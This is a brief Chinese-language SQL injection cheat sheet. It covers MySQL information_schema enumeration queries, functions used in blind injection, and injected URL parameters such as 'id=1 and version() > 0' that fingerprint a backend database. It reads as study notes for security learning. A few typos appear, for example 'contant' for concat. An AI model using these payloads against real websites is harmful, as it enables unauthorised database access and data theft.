# sql注入

## Mysql小知识

1. 一个数据库 `information_schema`
2. 一个表 `columns`
3. 三个字段 `table_schema` , `table_name` , `column_name`

## 基本查询

1. 所有数据库 `select group_concat(distinct table_schema) from information_schema.columns;` table_schema
2. 当前数据库 `select database();`
3. 数据库中的表 `select group_concat(distinct table_name) from information_schema.columns where table_schema='xxx';` table_name , table_schema
4. 表中的字段 `select group_concat(column_name) from information_schema.columns where table_name='xxx';` column_name

## 基本流程

1. 数据库 `select group_concat(distinct table_schema) from information_schema.columns;`
2. 表 `select group_concat(distinct table_name) from information_schema.columns where table_schema='xxx';`
3. 字段 `select group_concat(column_name) from information_schema.columns where table_name='xxx';`

## 常用函数

1. 数据库路径 `@@datadir`
2. 数据库版本 `@@version`
3. 当前用户/所有用户 `current_user(),user()`
4. 服务器主机名 `@@hostname`
5. 操作系统版本 `@@global.version_compile_o s`
6. `mid()`用于得到字符串的一部分 `mid('superman',5,1)` 将第一个参数，从其第五位开始，取一位字符
7. `ord()`返回字符串的ascii值
8. `concat()`用于连接一个或多个字符串 `contant('22','aa','33');` 输出的结果为：`22aa33`
9. `concat_ws()`用于连接一个或多个字符串，第一个为分隔符 `concat_ws('aa','11','22','33');` 输出结果为：`11aa22aa33`

## 确认数据库类型mysql

1. `http://url/index.php?id=1 and user > 0`  
2. `http://url/index.php?id=1 and version() > 0`  
3. `http://url/index.php?id=1 and (select count(*) from sysobjects) > 0`  
4. `http://url/index.php?id=1 and (select count(*) from mysobjects) > 0`